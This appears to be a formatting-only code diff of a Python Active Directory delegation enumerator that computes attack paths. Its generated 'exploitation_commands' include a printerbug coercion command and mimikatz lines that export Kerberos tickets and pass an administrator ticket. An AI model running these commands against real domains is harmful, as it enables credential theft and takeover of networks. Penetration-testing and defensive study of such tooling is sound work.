@@ -125,7 +125,9 @@ class DelegationEnumerator:
                 distinguished_name=acct.get("distinguishedname", ""),
                 object_sid=acct.get("objectsid", ""),
                 uac=uac,
-                service_principal_names=acct.get("serviceprincipalname", []) if isinstance(acct.get("serviceprincipalname"), list) else [acct.get("serviceprincipalname", "")],
+                service_principal_names=acct.get("serviceprincipalname", [])
+                if isinstance(acct.get("serviceprincipalname"), list)
+                else [acct.get("serviceprincipalname", "")],
             )
 
             target_props = acct.get("properties", {}) if isinstance(acct.get("properties"), dict) else {}
@@ -207,9 +209,7 @@ class DelegationEnumerator:
             List of DC delegation targets.
         """
         return [
-            t for t in self.targets
-            if t.is_unconstrained or t.is_constrained
-            if "DC=" in t.distinguished_name.upper()
+            t for t in self.targets if t.is_unconstrained or t.is_constrained if "DC=" in t.distinguished_name.upper()
         ]
 
     def compute_attack_paths(self) -> list[DelegationAttackPath]:
@@ -240,8 +240,8 @@ class DelegationEnumerator:
                 ],
                 exploitation_commands=[
                     f"python3 printerbug.py {self.domain}/attacker@{target.sam_account_name} TARGET_DC",
-                    "mimikatz.exe \"sekurlsa::tickets /export\"",
-                    "mimikatz.exe \"kerberos::ptt ADMINISTRATOR.kirbi\"",
+                    'mimikatz.exe "sekurlsa::tickets /export"',
+                    'mimikatz.exe "kerberos::ptt ADMINISTRATOR.kirbi"',
                 ],
             )
             self.attack_paths.append(path)
